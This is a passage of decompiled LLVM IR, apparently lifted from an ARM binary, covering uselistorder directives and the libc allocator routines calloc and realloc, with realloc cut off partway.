  uselistorder i32 %v7_12938, { 1, 0 }
  uselistorder i32 %v4_12938, { 1, 0 }
  uselistorder i32 %v0_12908, { 1, 0 }
  uselistorder i32 %v2_128dc, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_128d857, { 1, 0 }
  uselistorder i32 %v1_128a4, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1288c., { 1, 2, 0 }
  uselistorder i32 %v0_12894, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12894, { 1, 0 }
  uselistorder i32 %v3_12874, { 1, 0 }
  uselistorder i32 %v4_12870, { 1, 0, 2 }
  uselistorder i32 %v1_127e0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12838, { 1, 0 }
  uselistorder i32 %v1_1281c, { 1, 0 }
  uselistorder i32 %v1_126bc, { 1, 0 }
  uselistorder i32 %v0_127fc, { 2, 0, 1, 3 }
  uselistorder i32 %v3_127c4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12858.pre, { 1, 2, 0 }
  uselistorder i32 %v0_127a0, { 2, 1, 0 }
  uselistorder i32 %v3_12794, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_126b4, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_1275c, { 1, 0 }
  uselistorder i32 %v3_12750, { 1, 0 }
  uselistorder i32 %v0_1275c, { 1, 0 }
  uselistorder i32 %v3_12734, { 0, 2, 3, 1 }
  uselistorder i32 %v2_12724, { 1, 0, 2 }
  uselistorder i32 %v3_126dc, { 2, 1, 0 }
  uselistorder i32 %v0_126cc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1269c, { 1, 0 }
  uselistorder i32 %v1_12650, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1264c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_125f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_125e4, { 1, 0 }
  uselistorder i32 %v3_125b4, { 1, 0 }
  uselistorder i32 %v0_125a8, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_12588, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1257c, { 1, 0 }
  uselistorder i32 %v0_1254c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 39, 40, 41, 43, 44, 45, 46, 108, 109, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 80, 88, 75, 76, 77, 78, 79, 81, 82, 83, 84, 110, 85, 86, 87, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_12df4, { 1, 0 }
  uselistorder label %dec_label_pc_12dd8, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12dd4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_12dbc, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_12d50, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_12ccc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12cc4, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12b98, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_12acc, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_12984, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_128d8, { 1, 0 }
  uselistorder label %dec_label_pc_128e0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_128a4, { 1, 0 }
  uselistorder label %dec_label_pc_12858, { 1, 0 }
  uselistorder label %dec_label_pc_127ec, { 1, 0 }
  uselistorder label %dec_label_pc_127e8, { 1, 0 }
  uselistorder label %dec_label_pc_12794, { 1, 0 }
  uselistorder label %dec_label_pc_12780, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12748, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12734, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_12e08(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e08:
  %v0_12e08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e08, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12e08
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12e08, %bb
  %v4_12e24 = phi i32 [ %arg1, %dec_label_pc_12e08 ], [ 0, %bb ]
  ret i32 %v4_12e24

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_12e28 = load i32, i32* @r4, align 4
  %v6_12e28 = load i32, i32* @r5, align 4
  %v9_12e28 = load i32, i32* @r6, align 4
  %v12_12e28 = load i32, i32* @lr, align 4
  %v2_12e30 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12e40 = mul i32 %arg2, %arg1
  store i32 %v2_12e40, i32* @r6, align 4
  br i1 %v2_12e30, label %dec_label_pc_12e78, label %dec_label_pc_12e48

dec_label_pc_12e48:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_12e50 = udiv i32 %v2_12e40, %arg1
  %v9_12e54 = icmp eq i32 %v2_12e50, %arg2
  br i1 %v9_12e54, label %dec_label_pc_12e78, label %dec_label_pc_12e5c

dec_label_pc_12e5c:                               ; preds = %dec_label_pc_12e48
  %v0_12e60 = call i32 @__aeabi_read_tp()
  %v3_12e64 = load i16, i16* @global_var_2225c.361, align 2
  %v4_12e64 = sext i16 %v3_12e64 to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_12e70 = add i32 %v4_12e64, %v0_12e60
  %v4_12e70 = inttoptr i32 %v3_12e70 to i32*
  store i32 12, i32* %v4_12e70, align 4
  br label %dec_label_pc_12f3c

dec_label_pc_12e78:                               ; preds = %dec_label_pc_12e48, %entry
  %v4_12e7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 108) to i32*), align 4
  store i32 %v4_12e7c, i32* @r4, align 4
  %v4_12e94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 112) to i32*), align 4
  store i32 %v4_12e94, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12e94)
  %v0_12ea8 = load i32, i32* @r5, align 4
  %v2_12ea8 = add i32 %v0_12ea8, 16
  %v3_12ea8 = inttoptr i32 %v2_12ea8 to i32*
  %v4_12ea8 = load i32, i32* %v3_12ea8, align 4
  store i32 %v4_12ea8, i32* %ip.global-to-local, align 4
  store i32 77492, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12ea8)
  %v0_12eb4 = load i32, i32* @r6, align 4
  store i32 %v0_12eb4, i32* @r0, align 4
  %v0_12eb8 = call i32 @malloc()
  store i32 %v0_12eb8, i32* %r4.global-to-local, align 4
  %v2_12ebc = icmp eq i32 %v0_12eb8, 0
  br i1 %v2_12ebc, label %.thread, label %dec_label_pc_12ec4

dec_label_pc_12ec4:                               ; preds = %dec_label_pc_12e78
  %v1_12ec4 = add i32 %v0_12eb8, -4
  %v2_12ec4 = inttoptr i32 %v1_12ec4 to i32*
  %v3_12ec4 = load i32, i32* %v2_12ec4, align 4
  %v1_12ec8 = and i32 %v3_12ec4, 2
  %v2_12ec8 = icmp eq i32 %v1_12ec8, 0
  br i1 %v2_12ec8, label %dec_label_pc_12ed0, label %.thread

dec_label_pc_12ed0:                               ; preds = %dec_label_pc_12ec4
  %v1_12ed06 = add i32 %v3_12ec4, -4
  %v1_12ed4 = and i32 %v1_12ed06, -4
  %v3_12ed8 = udiv i32 %v1_12ed4, 4
  store i32 %v3_12ed8, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_12ed4, 36
  %v2_12ee0 = icmp ult i32 %v1_12ed4, 33
  %v3_12ee0 = or i1 %tmp, %v2_12ee0
  br i1 %v3_12ee0, label %dec_label_pc_12eec, label %dec_label_pc_12ee4

dec_label_pc_12ee4:                               ; preds = %dec_label_pc_12ed0
  %v3_12ee4 = inttoptr i32 %v0_12eb8 to i8*
  %v4_12ee4 = call i32 @__GI_memset(i8* %v3_12ee4, i32 0, i32 %v1_12ed4)
  br label %.thread

dec_label_pc_12eec:                               ; preds = %dec_label_pc_12ed0
  %tmp7 = icmp eq i32 %v1_12ed4, 16
  %v2_12ef0 = inttoptr i32 %v0_12eb8 to i32*
  store i32 0, i32* %v2_12ef0, align 4
  %v1_12ef4 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ef4 = add i32 %v1_12ef4, 4
  %v3_12ef4 = inttoptr i32 %v2_12ef4 to i32*
  store i32 0, i32* %v3_12ef4, align 4
  %v1_12ef8 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ef8 = add i32 %v1_12ef8, 8
  %v3_12ef8 = inttoptr i32 %v2_12ef8 to i32*
  store i32 0, i32* %v3_12ef8, align 4
  %v2_12efc = icmp ult i32 %v1_12ed4, 13
  %v3_12efc = or i1 %tmp7, %v2_12efc
  br i1 %v3_12efc, label %.thread, label %dec_label_pc_12f00

dec_label_pc_12f00:                               ; preds = %dec_label_pc_12eec
  %v0_12f00 = load i32, i32* %ip.global-to-local, align 4
  %v1_12f04 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f04 = add i32 %v1_12f04, 12
  %v3_12f04 = inttoptr i32 %v2_12f04 to i32*
  store i32 0, i32* %v3_12f04, align 4
  %v1_12f08 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f08 = add i32 %v1_12f08, 16
  %v3_12f08 = inttoptr i32 %v2_12f08 to i32*
  store i32 0, i32* %v3_12f08, align 4
  %tmp8 = icmp ult i32 %v0_12f00, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_12f10

dec_label_pc_12f10:                               ; preds = %dec_label_pc_12f00
  %v0_12f10 = load i32, i32* %ip.global-to-local, align 4
  %v7_12f10 = icmp eq i32 %v0_12f10, 9
  %v1_12f14 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f14 = add i32 %v1_12f14, 20
  %v3_12f14 = inttoptr i32 %v2_12f14 to i32*
  store i32 0, i32* %v3_12f14, align 4
  %v1_12f18 = load i32, i32* %r4.global-to-local, align 4
  %v2_12f18 = add i32 %v1_12f18, 24
  %v3_12f18 = inttoptr i32 %v2_12f18 to i32*
  store i32 0, i32* %v3_12f18, align 4
  br i1 %v7_12f10, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12f10
  %v2_12f1c = load i32, i32* %r4.global-to-local, align 4
  %v3_12f1c = add i32 %v2_12f1c, 32
  %v4_12f1c = inttoptr i32 %v3_12f1c to i32*
  store i32 0, i32* %v4_12f1c, align 4
  %v2_12f20 = load i32, i32* %r4.global-to-local, align 4
  %v3_12f20 = add i32 %v2_12f20, 28
  %v4_12f20 = inttoptr i32 %v3_12f20 to i32*
  store i32 0, i32* %v4_12f20, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12f10, %dec_label_pc_12ec4, %dec_label_pc_12f00, %dec_label_pc_12eec, %dec_label_pc_12e78, %dec_label_pc_12ee4, %bb
  store i32 1, i32* @r1, align 4
  %v0_12f30 = load i32, i32* @r5, align 4
  %v2_12f30 = add i32 %v0_12f30, 44
  %v3_12f30 = inttoptr i32 %v2_12f30 to i32*
  %v4_12f30 = load i32, i32* %v3_12f30, align 4
  store i32 %v4_12f30, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12f30)
  br label %dec_label_pc_12f3c

dec_label_pc_12f3c:                               ; preds = %dec_label_pc_12e5c, %.thread
  %v0_12f3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_12e28, i32* @r4, align 4
  store i32 %v6_12e28, i32* @r5, align 4
  store i32 %v9_12e28, i32* @r6, align 4
  store i32 %v12_12e28, i32* @lr, align 4
  ret i32 %v0_12f3c

; uselistorder directives
  uselistorder i32 %v1_12ed4, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_12eb8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 8, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12f3c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_12f68 = load i32, i32* @r4, align 4
  %v6_12f68 = load i32, i32* @r5, align 4
  %v9_12f68 = load i32, i32* @r6, align 4
  %v12_12f68 = load i32, i32* @r7, align 4
  %v15_12f68 = load i32, i32* @r8, align 4
  %v18_12f68 = load i32, i32* @sb, align 4
  %v21_12f68 = load i32, i32* @sl, align 4
  %v24_12f68 = load i32, i32* @fp, align 4
  %v27_12f68 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_12f74 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_12f74, label %dec_label_pc_12f88, label %dec_label_pc_12f98

dec_label_pc_12f88:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_12f8c = call i32 @malloc()
  store i32 %v0_12f8c, i32* %r0.global-to-local, align 4
  store i32 %v0_12f8c, i32* @r4, align 4
  br label %dec_label_pc_132f8

dec_label_pc_12f98:                               ; preds = %entry
  %v2_12f98 = icmp eq i32 %arg2, 0
  br i1 %v2_12f98, label %dec_label_pc_12fa0, label %dec_label_pc_12fac

dec_label_pc_12fa0:                               ; preds = %dec_label_pc_12f98
  %v0_12fa0 = call i32 @free()
  store i32 %v0_12fa0, i32* %r0.global-to-local, align 4
  %v0_12fa4 = load i32, i32* @r6, align 4
  store i32 %v0_12fa4, i32* @r4, align 4
  br label %dec_label_pc_132f8

dec_label_pc_12fac:                               ; preds = %dec_label_pc_12f98
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12fb4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 108) to i32*), align 4
  store i32 %v4_12fb4, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12fb4, i32* %r2.global-to-local, align 4
  %v4_12fc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 68) to i32*), align 4
  store i32 %v4_12fc0, i32* %r1.global-to-local, align 4
  %v2_12fc4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_12fc4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12fcc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12fcc)
  %v0_12fd8 = load i32, i32* @r4, align 4
  store i32 %v0_12fd8, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r1.global-to-local, align 4
  %v4_12fe4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_12ff0.469 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12fe4)
  %v0_12ff0 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_12ff0, -32
  br i1 %tmp36, label %dec_label_pc_13014, label %dec_label_pc_12ff8

dec_label_pc_12ff8:                               ; preds = %dec_label_pc_12fac
  store i32 62036, i32* %r2.global-to-local, align 4
  %v0_12ffc = call i32 @__aeabi_read_tp()
  store i32 %v0_12ffc, i32* %r0.global-to-local, align 4
  %v3_13000 = load i16, i16* @global_var_2225c.361, align 2
  %v4_13000 = sext i16 %v3_13000 to i32
  store i32 %v4_13000, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_1300c = add i32 %v4_13000, %v0_12ffc
  %v4_1300c = inttoptr i32 %v3_1300c to i32*
  store i32 12, i32* %v4_1300c, align 4
  br label %dec_label_pc_132f8

dec_label_pc_13014:                               ; preds = %dec_label_pc_12fac
  %v1_13014 = add i32 %v0_12ff0, 11
  store i32 %v1_13014, i32* %r0.global-to-local, align 4
  %v0_13018 = load i32, i32* @r5, align 4
  %v1_13018 = add i32 %v0_13018, -4
  %v2_13018 = inttoptr i32 %v1_13018 to i32*
  %v3_13018 = load i32, i32* %v2_13018, align 4
  store i32 %v3_13018, i32* %r2.global-to-local, align 4
  %v2_1301c = icmp ugt i32 %v1_13014, 14
  %v7_1301c = icmp eq i32 %v1_13014, 15
  %v2_13020 = xor i1 %v2_1301c, true
  %v3_13020 = or i1 %v7_1301c, %v2_13020
  br i1 %v3_13020, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_13014
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_13014, %bb
  %v2_13024 = xor i1 %v7_1301c, true
  %v3_13024 = and i1 %v2_1301c, %v2_13024
  br i1 %v3_13024, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_13024 = and i32 %v1_13014, -8
  store i32 %v5_13024, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_13028 = and i32 %v3_13018, 2
  %v2_13028 = icmp eq i32 %v1_13028, 0
  %v1_1302c = add i32 %v0_13018, -8
  store i32 %v1_1302c, i32* @sl, align 4
  %v1_13030 = and i32 %v3_13018, -4
  store i32 %v1_13030, i32* @r6, align 4
  br i1 %v2_13028, label %dec_label_pc_13038, label %dec_label_pc_13210

dec_label_pc_13038:                               ; preds = %bb29
  %v1_13038 = load i32, i32* @sb, align 4
  %v3_13038 = icmp ult i32 %v1_13030, %v1_13038
  br i1 %v3_13038, label %dec_label_pc_13044, label %bb30

bb30:                                             ; preds = %dec_label_pc_13038
  store i32 %v1_13030, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131a8

dec_label_pc_13044:                               ; preds = %dec_label_pc_13038
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1304c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_1304c, i32* %r0.global-to-local, align 4
  %v1_13050 = add i32 %v4_1304c, 44
  %v2_13050 = inttoptr i32 %v1_13050 to i32*
  %v3_13050 = load i32, i32* %v2_13050, align 4
  store i32 %v3_13050, i32* %r3.global-to-local, align 4
  %v2_13054 = add i32 %v1_13030, %v1_1302c
  store i32 %v2_13054, i32* @r4, align 4
  %v9_13058 = icmp eq i32 %v2_13054, %v3_13050
  %v1_1305c = add i32 %v2_13054, 4
  %v2_1305c = inttoptr i32 %v1_1305c to i32*
  %v3_1305c = load i32, i32* %v2_1305c, align 4
  store i32 %v3_1305c, i32* %r1.global-to-local, align 4
  br i1 %v9_13058, label %dec_label_pc_13064, label %dec_label_pc_130a0

dec_label_pc_13064:                               ; preds = %dec_label_pc_13044
  %v1_13064 = and i32 %v3_1305c, -4
  %v2_13068 = add i32 %v1_13064, %v1_13030
  store i32 %v2_13068, i32* %r1.global-to-local, align 4
  %v1_1306c = add i32 %v1_13038, 16
  store i32 %v1_1306c, i32* %r3.global-to-local, align 4
  %v3_13070 = icmp ult i32 %v2_13068, %v1_1306c
  br i1 %v3_13070, label %dec_label_pc_130f4, label %dec_label_pc_13078

dec_label_pc_13078:                               ; preds = %dec_label_pc_13064
  %v2_13078 = sub i32 %v2_13068, %v1_13038
  %v1_1307c = urem i32 %v3_13018, 2
  %v2_13080 = add i32 %v1_13038, %v1_1302c
  store i32 %v2_13080, i32* %r1.global-to-local, align 4
  %v2_13084 = or i32 %v1_13038, %v1_1307c
  store i32 %v2_13084, i32* %r2.global-to-local, align 4
  %v1_13088 = or i32 %v2_13078, 1
  store i32 %v1_13088, i32* %r3.global-to-local, align 4
  store i32 %v0_13018, i32* @r4, align 4
  store i32 %v2_13084, i32* %v2_13018, align 4
  %v0_13094 = load i32, i32* %r1.global-to-local, align 4
  %v1_13094 = load i32, i32* %r0.global-to-local, align 4
  %v2_13094 = add i32 %v1_13094, 44
  %v3_13094 = inttoptr i32 %v2_13094 to i32*
  store i32 %v0_13094, i32* %v3_13094, align 4
  %v0_13098 = load i32, i32* %r3.global-to-local, align 4
  %v1_13098 = load i32, i32* %r1.global-to-local, align 4
  %v2_13098 = add i32 %v1_13098, 4
  %v3_13098 = inttoptr i32 %v2_13098 to i32*
  store i32 %v0_13098, i32* %v3_13098, align 4
  br label %dec_label_pc_132dc

dec_label_pc_130a0:                               ; preds = %dec_label_pc_13044
  %v1_130a0 = and i32 %v3_1305c, -2
  %v2_130a4 = add i32 %v1_130a0, %v2_13054
  store i32 %v2_130a4, i32* %r3.global-to-local, align 4
  %v1_130a8 = add i32 %v2_130a4, 4
  %v2_130a8 = inttoptr i32 %v1_130a8 to i32*
  %v3_130a8 = load i32, i32* %v2_130a8, align 4
  store i32 %v3_130a8, i32* %r3.global-to-local, align 4
  %v1_130ac = urem i32 %v3_130a8, 2
  %v2_130ac = icmp eq i32 %v1_130ac, 0
  br i1 %v2_130ac, label %dec_label_pc_130b4, label %dec_label_pc_130f4

dec_label_pc_130b4:                               ; preds = %dec_label_pc_130a0
  %v1_130b4 = and i32 %v3_1305c, -4
  store i32 %v1_130b4, i32* %r3.global-to-local, align 4
  %v2_130b8 = add i32 %v1_130b4, %v1_13030
  store i32 %v2_130b8, i32* %r0.global-to-local, align 4
  %v3_130bc = icmp ult i32 %v2_130b8, %v1_13038
  br i1 %v3_130bc, label %dec_label_pc_130f4, label %dec_label_pc_130c4

dec_label_pc_130c4:                               ; preds = %dec_label_pc_130b4
  %v1_130c4 = add i32 %v1_13030, %v0_13018
  %v2_130c4 = inttoptr i32 %v1_130c4 to i32*
  %v3_130c4 = load i32, i32* %v2_130c4, align 4
  store i32 %v3_130c4, i32* %r1.global-to-local, align 4
  %v1_130c8 = add i32 %v3_130c4, 12
  %v2_130c8 = inttoptr i32 %v1_130c8 to i32*
  %v3_130c8 = load i32, i32* %v2_130c8, align 4
  store i32 %v3_130c8, i32* %r3.global-to-local, align 4
  %v9_130cc = icmp eq i32 %v3_130c8, %v2_13054
  %v1_130d0 = add i32 %v2_13054, 12
  %v2_130d0 = inttoptr i32 %v1_130d0 to i32*
  %v3_130d0 = load i32, i32* %v2_130d0, align 4
  store i32 %v3_130d0, i32* %r2.global-to-local, align 4
  br i1 %v9_130cc, label %dec_label_pc_130d8, label %dec_label_pc_130e4

dec_label_pc_130d8:                               ; preds = %dec_label_pc_130c4
  %v1_130d8 = add i32 %v3_130d0, 8
  %v2_130d8 = inttoptr i32 %v1_130d8 to i32*
  %v3_130d8 = load i32, i32* %v2_130d8, align 4
  store i32 %v3_130d8, i32* %r3.global-to-local, align 4
  %v9_130dc = icmp eq i32 %v3_130d8, %v2_13054
  br i1 %v9_130dc, label %dec_label_pc_130e8, label %dec_label_pc_130e4

dec_label_pc_130e4:                               ; preds = %dec_label_pc_130c4, %dec_label_pc_130d8
  %v0_130e4 = call i32 @abort()
  store i32 %v0_130e4, i32* %r0.global-to-local, align 4
  %v0_130e8.pre = load i32, i32* @r1, align 4
  %v1_130e8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_130e8

dec_label_pc_130e8:                               ; preds = %dec_label_pc_130d8, %dec_label_pc_130e4
  %v1_130e8 = phi i32 [ %v3_130d0, %dec_label_pc_130d8 ], [ %v1_130e8.pre, %dec_label_pc_130e4 ]
  %v0_130e8 = phi i32 [ %v3_130c4, %dec_label_pc_130d8 ], [ %v0_130e8.pre, %dec_label_pc_130e4 ]
  %v2_130e8 = add i32 %v1_130e8, 8
  %v3_130e8 = inttoptr i32 %v2_130e8 to i32*
  store i32 %v0_130e8, i32* %v3_130e8, align 4
  %v0_130ec = load i32, i32* %r2.global-to-local, align 4
  %v1_130ec = load i32, i32* %r1.global-to-local, align 4
  %v2_130ec = add i32 %v1_130ec, 12
  %v3_130ec = inttoptr i32 %v2_130ec to i32*
  store i32 %v0_130ec, i32* %v3_130ec, align 4
  %v1_131a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131a8

dec_label_pc_130f4:                               ; preds = %dec_label_pc_13064, %dec_label_pc_130b4, %dec_label_pc_130a0
  %v1_130f4 = add i32 %v1_13038, -7
  store i32 %v1_130f4, i32* @r0, align 4
  %v0_130f8 = call i32 @malloc()
  store i32 %v0_130f8, i32* @r0, align 4
  store i32 %v0_130f8, i32* %r1.global-to-local, align 4
  %v2_130fc = icmp eq i32 %v0_130f8, 0
  br i1 %v2_130fc, label %bb31, label %dec_label_pc_13108

bb31:                                             ; preds = %dec_label_pc_130f4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_132dc

dec_label_pc_13108:                               ; preds = %dec_label_pc_130f4
  %v1_13110.pre = load i32, i32* @r4, align 4
  %v1_13108 = add i32 %v0_130f8, -4
  %v2_13108 = inttoptr i32 %v1_13108 to i32*
  %v3_13108 = load i32, i32* %v2_13108, align 4
  store i32 %v3_13108, i32* @r3, align 4
  %v1_1310c = add i32 %v0_130f8, -8
  store i32 %v1_1310c, i32* @r7, align 4
  %v9_13110 = icmp eq i32 %v1_1310c, %v1_13110.pre
  br i1 %v9_13110, label %.thread2, label %dec_label_pc_13120

.thread2:                                         ; preds = %dec_label_pc_13108
  %v2_13114 = and i32 %v3_13108, -4
  store i32 %v2_13114, i32* %r3.global-to-local, align 4
  %v2_13118 = load i32, i32* @r6, align 4
  %v3_13118 = add i32 %v2_13118, %v2_13114
  store i32 %v3_13118, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131a8

dec_label_pc_13120:                               ; preds = %dec_label_pc_13108
  %v0_13120 = load i32, i32* @r6, align 4
